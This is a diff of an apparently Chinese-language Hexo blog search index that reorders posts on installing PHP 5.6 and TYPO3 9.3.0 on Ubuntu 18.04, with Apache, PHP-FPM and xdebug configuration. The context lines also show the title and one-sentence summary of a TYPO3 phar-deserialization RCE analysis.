+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">zend_extension=xdebug.so</span><br><span class="line">xdebug.profiler_output_dir="/tmp/log"</span><br><span class="line">xdebug.trace_output_dir="/tmp/log"</span><br><span class="line">xdebug.remote_enable  = true</span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line">xdebug.remote_host   = 127.0.0.1   </span><br><span class="line">xdebug.remote_port   = 9000  </span><br><span class="line">xdebug.profiler_enable  = on</span><br><span class="line">xdebug.auto_trace   = On</span><br><span class="line">xdebug.show_exception_trace = On</span><br><span class="line">xdebug.remote_autostart  = On</span><br><span class="line">xdebug.collect_vars   = On</span><br><span class="line">xdebug.collect_return  = On</span><br><span class="line">xdebug.remote_handler  =dbgp</span><br><span class="line">xdebug.max_nesting_level = 10000</span><br></pre></td></tr></table></figure>
+
+<p>执行如下命令，使得配置生效：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart php7.3-fpm</span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure>
+
+<p>最后，访问typo3.example.com，根据提示进行TYPO3 9.3.0安装即可。</p>
+<p>参考文章<a href="https://websiteforstudents.com/install-typo3-cms-using-composer-on-ubuntu-16-04-18-04-with-apache2-mariadb-and-php-7-2-support/" target="_blank" rel="noopener">https://websiteforstudents.com/install-typo3-cms-using-composer-on-ubuntu-16-04-18-04-with-apache2-mariadb-and-php-7-2-support/</a></p>
+]]></content>
+      <categories>
+        <category>Configuration</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>Ubuntu</tag>
+        <tag>TYPO3</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ubuntu 18.04 安装php 5.6</title>
+    <url>/2018/05/12/ubuntu-18-04-%E5%AE%89%E8%A3%85php-5-6/</url>
+    <content><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ondrej/php</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install php5.6</span><br><span class="line"></span><br><span class="line">you can install more php5.6 module</span><br><span class="line">sudo apt-get install php5.6-fpm php5.6-mbstring php5.6-mcrypt php5.6-mysql php5.6-xml php5.6-intl php-apcu php-uuid php5.6-cgi php5.6-cli php5.6-gd php5.6-ldap php5.6-sqlite3 php-uploadprogress libapache2-mod-php5.6</span><br></pre></td></tr></table></figure>
+
+<p>php7.2与php5.6版本切换</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a2dismod php7.2</span><br><span class="line">a2enmod php5.6</span><br><span class="line">systemctl restart apache2</span><br></pre></td></tr></table></figure>
+
+<p>默认没有开启<code>PHP 5.6 FPM</code>，为了开启<code>PHP 5.6 FPM</code>，需要执行一下命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a2enmod proxy_fcgi setenvif </span><br><span class="line">a2enconf php5.6-fpm</span><br></pre></td></tr></table></figure>
+
+<p>同时执行如下命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a2disconf php7.2-fpm</span><br></pre></td></tr></table></figure>
+
+<p>最后重启<code>apache</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl reload apache2</span><br></pre></td></tr></table></figure>
+
+<p>以上命令是Apache上PHP版本切换的命令，下面是CLI端切换的命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --set php /usr/bin/php7.2</span><br><span class="line">sudo update-alternatives --set phpize /usr/bin/phpize7.2</span><br><span class="line">sudo update-alternatives --set php-config /usr/bin/php-config7.2</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Configuration</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>Ubuntu</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>TYPO3-CORE-SA-2018-002 RCE分析</title>
     <url>/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<p>这个漏洞的原因在于对phar文件的过滤不严，导致可以远程代码执行。这里涉及到phar的反序列化，具体参见 <a href="https://www.twitter.com/@_s_n_t" target="_blank" rel="noopener">Sam Thomas</a> 关于[phar unserialize][<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf]的文章。" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf]的文章。</a></p>
@@ -599,92 +688,6 @@
       <tags>
         <tag>PHP</tag>
         <tag>OSWE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ubuntu 18.04 安装php 5.6</title>
-    <url>/2018/05/12/ubuntu-18-04-%E5%AE%89%E8%A3%85php-5-6/</url>
-    <content><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ondrej/php</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install php5.6</span><br><span class="line"></span><br><span class="line">you can install more php5.6 module</span><br><span class="line">sudo apt-get install php5.6-fpm php5.6-mbstring php5.6-mcrypt php5.6-mysql php5.6-xml php5.6-intl php-apcu php-uuid php5.6-cgi php5.6-cli php5.6-gd php5.6-ldap php5.6-sqlite3 php-uploadprogress libapache2-mod-php5.6</span><br></pre></td></tr></table></figure>
-
-<p>php7.2与php5.6版本切换</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a2dismod php7.2</span><br><span class="line">a2enmod php5.6</span><br><span class="line">systemctl restart apache2</span><br></pre></td></tr></table></figure>
-
-<p>默认没有开启<code>PHP 5.6 FPM</code>，为了开启<code>PHP 5.6 FPM</code>，需要执行一下命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a2enmod proxy_fcgi setenvif </span><br><span class="line">a2enconf php5.6-fpm</span><br></pre></td></tr></table></figure>
-
-<p>同时执行如下命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a2disconf php7.2-fpm</span><br></pre></td></tr></table></figure>
-
-<p>最后重启<code>apache</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl reload apache2</span><br></pre></td></tr></table></figure>
-
-<p>以上命令是Apache上PHP版本切换的命令，下面是CLI端切换的命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --set php /usr/bin/php7.2</span><br><span class="line">sudo update-alternatives --set phpize /usr/bin/phpize7.2</span><br><span class="line">sudo update-alternatives --set php-config /usr/bin/php-config7.2</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Configuration</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>Ubuntu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ubuntu 18.04安装TYPO3 9.3.0</title>
-    <url>/2018/06/12/ubuntu-18-04%E5%AE%89%E8%A3%85TYPO3-9-3-0/</url>
-    <content><![CDATA[<h2 id="环境概况"><a href="#环境概况" class="headerlink" title="环境概况"></a>环境概况</h2><p>本实验环境采用的是Ubuntu 18.04，Apache版本为2.4.29，PHP版本为7.3.PHP版本为7.2的时候出现了未知错误，导致一直安装不成功，无奈切换成PHP7.3</p>
-<p>PHP7.3在Ubuntu 18.04上的安装步骤如下：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install software-properties-common</span><br><span class="line">sudo add-apt-repository ppa:ondrej/php</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install php7.3 libapache2-mod-php7.3 php7.3-cli php7.3-mysql php7.3-gd php7.3-imagick php7.3-recode php7.3-tidy php7.3-xmlrpc php7.3-common php7.3-curl php7.3-mbstring php7.3-xml php7.3-bcmath php7.3-bz2 php7.3-intl php7.3-json php7.3-readline php7.3-zip</span><br></pre></td></tr></table></figure>
-
-<p>PHP7.3没有安装FPM，所以需要单独安装FPM</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install php7.3-fpm</span><br></pre></td></tr></table></figure>
-
-<p>因为我本地安装了PHP7.2和PHP7.3两个版本，为了让Apache采用PHP7.3来解析脚本，需要执行下列命令：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo a2dismod php7.2</span><br><span class="line">sudo a2enmod php7.3</span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure>
-
-<p>多版本PHP的切换可以使用一下命令：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --config php</span><br></pre></td></tr></table></figure>
-
-<p>根据提示进行选择即可。</p>
-<h2 id="TYPO3-9-3-0安装"><a href="#TYPO3-9-3-0安装" class="headerlink" title="TYPO3 9.3.0安装"></a>TYPO3 9.3.0安装</h2><p>将下载的TYPO3.CMS-9.3.0.tar.gz解压缩放到/var/www/htdocs/目录下，我这里解压缩之后的文件夹命名为typo3，进入typo3,执行<code>composer</code>安装所需的包。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo composer install --no-dev</span><br></pre></td></tr></table></figure>
-
-<p>修改Apache默认路径的执行权限：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chown -R www-data:www-data /var/www/htdocs/typo3/</span><br><span class="line">sudo chmod -R 755 /var/www/htdocs/typo3/</span><br></pre></td></tr></table></figure>
-
-<p>配置Apache：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo code /etc/apache2/sites-available/typo3.conf --user-data-dir</span><br></pre></td></tr></table></figure>
-
-<p>内容修改如下：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:80</span>&gt;</span></span><br><span class="line">ServerName typo3.example.com</span><br><span class="line">DocumentRoot /var/www/htdocs</span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> /<span class="attr">var</span>/<span class="attr">www</span>/<span class="attr">htdocs</span>/<span class="attr">typo3</span>/&gt;</span></span><br><span class="line">Options +FollowSymlinks</span><br><span class="line">AllowOverride All</span><br><span class="line">Require all granted</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">ErrorLog /var/log/apache2/typo3.example.com-error_log</span><br><span class="line">CustomLog /var/log/apache2/typo3.example.com-access_log common</span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>继续执行如下命令，使得typo3.conf生效及加载必要的模块：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo a2dissite 000-default.conf</span><br><span class="line">sudo a2ensite typo3.conf</span><br><span class="line">sudo a2enmod rewrite</span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure>
-
-<p>安装ImageMagick/GraphicsMagick，推荐ImageMagick：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install imagemagick</span><br></pre></td></tr></table></figure>
-
-<p>TYPO3安装的时候，需要修改php.ini中的几个参数，到目录/etc/php/7.3/fpm/php.ini下修改即可。</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">max_execution_time = 360</span><br><span class="line">max_input_vars = 1500</span><br></pre></td></tr></table></figure>
-
-<h2 id="配置xdebug-ini"><a href="#配置xdebug-ini" class="headerlink" title="配置xdebug.ini"></a>配置xdebug.ini</h2><p>xdebug.ini文件路径为/etc/php/7.3/mods-available/xdebug.ini</p>
-<p>具体配置信息如下：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">zend_extension=xdebug.so</span><br><span class="line">xdebug.profiler_output_dir="/tmp/log"</span><br><span class="line">xdebug.trace_output_dir="/tmp/log"</span><br><span class="line">xdebug.remote_enable  = true</span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line">xdebug.remote_host   = 127.0.0.1   </span><br><span class="line">xdebug.remote_port   = 9000  </span><br><span class="line">xdebug.profiler_enable  = on</span><br><span class="line">xdebug.auto_trace   = On</span><br><span class="line">xdebug.show_exception_trace = On</span><br><span class="line">xdebug.remote_autostart  = On</span><br><span class="line">xdebug.collect_vars   = On</span><br><span class="line">xdebug.collect_return  = On</span><br><span class="line">xdebug.remote_handler  =dbgp</span><br><span class="line">xdebug.max_nesting_level = 10000</span><br></pre></td></tr></table></figure>
-
-<p>执行如下命令，使得配置生效：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart php7.3-fpm</span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure>
-
-<p>最后，访问typo3.example.com，根据提示进行TYPO3 9.3.0安装即可。</p>
-<p>参考文章<a href="https://websiteforstudents.com/install-typo3-cms-using-composer-on-ubuntu-16-04-18-04-with-apache2-mariadb-and-php-7-2-support/" target="_blank" rel="noopener">https://websiteforstudents.com/install-typo3-cms-using-composer-on-ubuntu-16-04-18-04-with-apache2-mariadb-and-php-7-2-support/</a></p>
-]]></content>
-      <categories>
-        <category>Configuration</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>TYPO3</tag>
-        <tag>Ubuntu</tag>
       </tags>
   </entry>
   <entry>
